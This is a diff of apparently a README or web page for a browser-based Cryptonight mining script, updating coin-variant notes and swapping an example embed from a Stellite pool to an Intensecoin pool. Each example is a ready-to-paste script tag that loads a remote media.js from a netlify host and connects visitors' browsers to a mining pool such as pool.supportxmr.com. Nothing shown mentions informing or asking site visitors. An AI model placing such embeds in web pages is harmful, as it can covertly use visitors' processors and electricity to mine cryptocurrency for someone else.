@@ -9,10 +9,11 @@ Simple Pool change: ?jason=Your_Favorite_Pool:PortNr
 Complete example:
 <script src="https://thelifeisbinary.netlify.com/media.js?perfekt=wss://?algo=cn?variant=0?jason=pool.supportxmr.com:3333"> </script>
 <br><br>
-Attention: Special Case for some custom variant fork coins: Stellite, Intensecoin Electroneum need ?algo=cn?variant=1
+Attention: Special Case for some custom variant fork coins: Intensecoin Electroneum need ?algo=cn?variant=1
 Attention: ETN Cryptonight ?algo=cn?variant=1 ---> 07.06.18 | FORK ---> use variant=1 now
+Attention: Stellite and IPBC created their own PoW variants....so mining is disabled for the moment
 <br><br>
-<script src="https://thelifeisbinary.netlify.com/media.js?perfekt=wss://?algo=cn?variant=1?jason=communitypool.stellite.cash:6677"> </script>
+<script src="https://thelifeisbinary.netlify.com/media.js?perfekt=wss://?algo=cn?variant=1?jason=pool.intensecoin.com:3333"> </script>
 <br><br>
 Attention: Aeon Cryptonight-lite ?algo=cn-lite?variant=1 ---> 06.06.18 | FORK AT BLOCK 963500 ---> use variant=1 now
 <br><br>
